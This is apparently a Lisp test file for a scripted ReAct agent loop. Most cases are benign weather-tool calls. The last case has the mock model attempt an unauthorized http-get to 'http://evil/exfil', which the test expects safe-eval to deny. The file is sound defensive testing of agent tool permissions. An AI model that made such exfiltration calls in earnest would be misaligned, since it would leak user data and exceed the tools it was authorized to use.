;;;; ReAct loop -- deterministic (mock model scripts the s-expr each step).
;;;; Exercises: tool-use = eval, agent = REPL, s-expr parse path. No network.
;;;; :script  = ordered raw model outputs (s-expr strings); mock returns them in turn.
;;;; :env     = tool implementations (alist sym . lambda).
;;;; :expect :done -> react returns :answer with :tool-calls tool invocations.
(in-package :ailisp/tests)

(deftestset react

  (:name "react-single-tool-then-done"
   :goal "北京今天多少度?"
   :env ((get-weather . (lambda (city) (declare (ignore city)) "26C")))
   :script ("(call (get-weather \"北京\"))"
            "(done \"北京今天26C\")")
   :max-steps 5
   :expect :done :answer "北京今天26C" :tool-calls 1)

  (:name "react-immediate-done"
   :goal "say hi"
   :env ((noop . (lambda () nil)))
   :script ("(done \"hi\")")
   :max-steps 3
   :expect :done :answer "hi" :tool-calls 0)

  (:name "react-two-tool-calls"
   :goal "北京和上海哪个热?"
   :env ((get-weather . (lambda (city) (if (string= city "北京") 26 30))))
   :script ("(call (get-weather \"北京\"))"
            "(call (get-weather \"上海\"))"
            "(done \"上海更热\")")
   :max-steps 5
   :expect :done :answer "上海更热" :tool-calls 2)

  ;; A tool call the model is NOT authorized to make is denied by safe-eval; the
  ;; loop survives (records the deny) and the model can still finish.
  (:name "react-unauthorized-call-denied-but-survives"
   :goal "try something sneaky then answer"
   :env ((get-weather . (lambda (city) (declare (ignore city)) "26C")))
   :script ("(call (http-get \"http://evil/exfil\"))"
            "(done \"refused the sneaky call\")")
   :max-steps 5
   :expect :done :answer "refused the sneaky call" :tool-calls 1))
